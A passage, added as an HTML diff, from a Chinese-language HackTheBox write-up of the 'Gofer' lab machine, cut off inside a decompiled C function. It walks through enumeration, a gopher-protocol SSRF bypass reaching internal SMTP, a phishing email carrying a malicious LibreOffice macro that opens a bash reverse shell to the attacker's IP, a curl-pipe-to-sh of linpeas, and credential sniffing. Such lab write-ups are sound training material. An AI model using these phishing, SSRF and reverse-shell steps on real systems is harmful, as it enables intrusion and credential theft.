@@ -1,0 +1,1430 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Download/">
+      
+      
+        <link rel="next" href="../Manager/">
+      
+      
+      <link rel="icon" href="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.2">
+    
+    
+      
+        <title>Hard - Gofer - Write-up</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hard-gofer" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Write-up" class="md-header__button md-logo" aria-label="Write-up" data-md-component="logo">
+      
+  <img src="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Write-up
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Hard - Gofer
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  HackTheBox
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Write-up" class="md-nav__button md-logo" aria-label="Write-up" data-md-component="logo">
+      
+  <img src="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512" alt="logo">
+
+    </a>
+    Write-up
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Crypto
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Crypto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Crypto/VeryEasy-BabyEncryption/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Very Easy - BabyEncryption
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Web
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Web/Easy-ProxyAsAService/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Easy-ProxyAsAService
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Appsanity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Appsanity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Codify/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Codify
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Download/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Download
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Hard - Gofer
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Hard - Gofer
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#subdomain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Subdomain
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-jhudson" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as jhudson
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shell as jhudson">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-usertxt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get User.txt
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linpeassh" class="md-nav__link">
+    <span class="md-ellipsis">
+      linpeas.sh
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-tbuckley" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as tbuckley
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as root
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shell as root">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-roottxt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get root.txt
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Manager/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Manager
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Rebound/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rebound
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Visual/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Visual
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Sherlocks
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Sherlocks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/OpTinselTrace-1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpTinselTrace-1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/TickTock/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    TickTock
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="hard-gofer">Hard - Gofer</h1>
+<p><img alt="Gofer" src="../assets/202310282359113.png" /></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="language-text highlight"><pre><span></span><code># IP=&#39;10.10.11.225&#39;; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep &#39;/tcp\|/udp&#39; | awk -F &#39;/&#39; &#39;{print $1}&#39; | tr &#39;\n&#39; &#39;,&#39;) $IP -oN nmap.txt
+
+Nmap scan report for 10.10.11.225
+Host is up (0.22s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 aa25826eb804b6a9a95e1a91f09451dd (RSA)
+|   256 1821baa7dce44f60d781039a5dc2e596 (ECDSA)
+|_  256 a42d0d45132a9e7f867af6f778bc42d9 (ED25519)
+25/tcp  filtered smtp
+80/tcp  open  http        Apache httpd 2.4.56
+|_http-server-header: Apache/2.4.56 (Debian)
+|_http-title: Did not follow redirect to http://gofer.htb/
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2023-10-28T16:10:54
+|_  start_date: N/A
+|_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
+</code></pre></div>
+<h3 id="smb">SMB</h3>
+<div class="language-text highlight"><pre><span></span><code>cme smb 10.10.11.225 -u guest -p &#39;&#39;  --shares
+</code></pre></div>
+<p><img alt="image-20231029004846069" src="../assets/202310290048135.png" /></p>
+<div class="language-text highlight"><pre><span></span><code>smbclient \\\\10.10.11.225\\shares -U guest
+</code></pre></div>
+<p><img alt="image-20231029005132290" src="../../../../../../../../home/zer0-hex/.config/Typora/typora-user-images/image-20231029005132290.png" /></p>
+<ul>
+<li>mail</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
+Return-Path: &lt;jdavis@gofer.htb&gt;
+X-Original-To: tbuckley@gofer.htb
+Delivered-To: tbuckley@gofer.htb
+Received: from gofer.htb (localhost [127.0.0.1])
+        by gofer.htb (Postfix) with SMTP id C8F7461827
+        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
+Subject:Important to read!
+Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;
+Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
+From: jdavis@gofer.htb
+
+Hello guys,
+
+Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That&#39;s why from now on, I&#39;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.
+
+PS: Last thing for Tom; I know you&#39;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via &lt;Limit&gt;
+</code></pre></div>
+<h3 id="subdomain">Subdomain</h3>
+<div class="language-text highlight"><pre><span></span><code># ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://gofer.htb -H &quot;Host: FUZZ.gofer.htb&quot; -c -mc all --fw 20
+
+proxy                   [Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 248ms]
+</code></pre></div>
+<h3 id="http">HTTP</h3>
+<ul>
+<li>gofer.htb</li>
+</ul>
+<p><img alt="image-20231029005548382" src="../assets/202310290055760.png" /></p>
+<p>结合邮箱中用户名的命名方式 <code>jdavis tbuckley</code> 猜测所有人的用户名</p>
+<div class="language-text highlight"><pre><span></span><code>jdavis      Chief Executive Officer
+jhudson     Product Manager
+tbuckley    CTO
+ablake      Accountant
+</code></pre></div>
+<ul>
+<li>目录枚举</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># feroxbuster -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -m GET,POST,PUT,OPTIONS,DELETE,PATCH -s 200 -u http://gofer.htb/
+
+No High Value Path
+</code></pre></div>
+<ul>
+<li>proxy.gofer.htb</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># feroxbuster -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -m GET,POST,PUT,OPTIONS,DELETE,PATCH -s 200 -u http://proxy.gofer.htb/
+...
+200     POST        2l       10w       81c http://proxy.gofer.htb/index.php
+200      PUT        2l       10w       81c http://proxy.gofer.htb/index.php
+200  OPTIONS        2l       10w       81c http://proxy.gofer.htb/index.php
+200   DELETE        2l       10w       81c http://proxy.gofer.htb/index.php
+200    PATCH        2l       10w       81c http://proxy.gofer.htb/index.php
+...
+</code></pre></div>
+<p><img alt="image-20231029012145079" src="../assets/202310290121155.png" /></p>
+<p>请求参数 <code>url=localhost</code> 存在黑名单</p>
+<p><img alt="image-20231029012506798" src="../assets/202310290125833.png" /></p>
+<p>请求 <code>url=127.0.0.1</code> 响应 gofer.htb 页面</p>
+<p><img alt="image-20231029012639993" src="../assets/202310290126023.png" /></p>
+<ul>
+<li>尝试其他 SSRF</li>
+</ul>
+<blockquote>
+<p>https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/</p>
+</blockquote>
+<p>对于请求的协议也存在黑名单</p>
+<p><img alt="image-20231029013243834" src="../assets/202310290132855.png" /></p>
+<p>尝试后发现 gopher 协议可以，但是对于地址有黑名单</p>
+<p><img alt="image-20231029013427293" src="../assets/202310290134323.png" /></p>
+<p>尝试绕过，可以用 0 代替 127.0.0.1 同时可以访问其他端口</p>
+<p><img alt="image-20231029014134989" src="../assets/202310290141013.png" /></p>
+<h2 id="shell-as-jhudson">Shell as jhudson</h2>
+<p>想到 nmap 扫描到 25 端口被过滤，同时 smb 服务的邮件提示可以使用 .odt 进行网络钓鱼（会有人点击链接）</p>
+<ul>
+<li>
+<p>构造恶意邮件发给 <code>Product Manager</code> 或者 <code>Accountant</code></p>
+</li>
+<li>
+<blockquote>
+<p>'https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/</p>
+</blockquote>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>_HELO 0
+MAIL FROM:&lt;jdavis@gofer.htbb&gt;
+RCPT TO:&lt;jhudson@gofer.htb&gt;
+DATA
+From: &lt;jdavis@gofer.htb&gt;
+To: &lt;jhudson@gofer.htb&gt;
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+Subject: AH AH AH
+
+http://10.10.16.47/good.odt
+.
+QUIT
+</code></pre></div>
+<p>首先启动 HTTP 服务，查看是否能收到请求</p>
+<p><img alt="image-20231029022216710" src="../assets/202310290222773.png" /></p>
+<ul>
+<li>邮件中说明公司使用 Libreoffice，极有可能会自动打开，因此构造恶意 .odt 文件</li>
+<li>Libreoffice：新建文件 -&gt; 保存为 good.odt -&gt; 工具 -&gt; 宏 -&gt; 编辑宏 -&gt; 工具 -&gt; 选择宏 -&gt; 选中文件 -&gt; New</li>
+<li>工具 -&gt; 管理宏 -&gt; Basic 语言 -&gt; 选择宏 -&gt; 注册 Assign -&gt; Events -&gt; 选中 Open Document -&gt; 添加宏 macro... -&gt; 选择恶意宏 -&gt; 设置保存到文件中 -&gt; OK -&gt; Run</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>REM  *****  BASIC  *****
+
+Sub Main
+    Shell(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.47/2233 0&gt;&amp;1&#39;&quot;)
+End Sub
+</code></pre></div>
+<p><img alt="image-20231029023249882" src="../assets/202310290232931.png" /></p>
+<p><img alt="image-20231029024458048" src="../assets/202310290244081.png" /></p>
+<p><img alt="image-20231029023710028" src="../assets/202310290237097.png" /></p>
+<h3 id="get-usertxt">Get User.txt</h3>
+<p><img alt="image-20231029025156873" src="../assets/202310290251944.png" /></p>
+<div class="language-text highlight"><pre><span></span><code>jhudson@gofer:~$ cat user.txt
+e07152e2976495f478ee9a8d0d356ea5
+</code></pre></div>
+<h3 id="linpeassh">linpeas.sh</h3>
+<div class="language-text highlight"><pre><span></span><code>[Attack]# nc -lvvnp 2233 | tee results/linpeas.log
+[Target]# curl http://10.10.16.47/linpeas.sh | sh &gt; /dev/tcp/10.10.16.47/2233 2&gt;1
+</code></pre></div>
+<h2 id="shell-as-tbuckley">Shell as tbuckley</h2>
+<p>发现 Capabilities</p>
+<p><img alt="image-20231029030823241" src="../assets/202310290308307.png" /></p>
+<blockquote>
+<p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</p>
+</blockquote>
+<p>尝试使用 tcpdump 提权</p>
+<ul>
+<li>/tmp/shell</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code>#!/bin/bash
+/bin/bash -p
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell
+</code></pre></div>
+<p><img alt="image-20231029033107145" src="../assets/202310290331181.png" /></p>
+<p>命令执行提权失败，想到 proxy.gofer.htb 是一个代理服务，可能会有其他用户使用，因此监听 80 端口，看看是否有流量出现。</p>
+<p><img alt="image-20231029033443391" src="../assets/202310290334435.png" /></p>
+<p>发现一个认证，解码发现是 tbuckley 的凭据</p>
+<p><img alt="image-20231029033518846" src="../assets/202310290335871.png" /></p>
+<p>tbuckley 在 dev 组，有一个 SUID 权限的可执行程序</p>
+<p><img alt="image-20231029033823016" src="../../../../../../../../home/zer0-hex/.config/Typora/typora-user-images/image-20231029033823016.png" /></p>
+<h2 id="shell-as-root">Shell as root</h2>
+<p>简单分析一下 notes</p>
+<p><img alt="image-20231029034005869" src="../assets/202310290340892.png" /></p>
+<div class="language-c highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
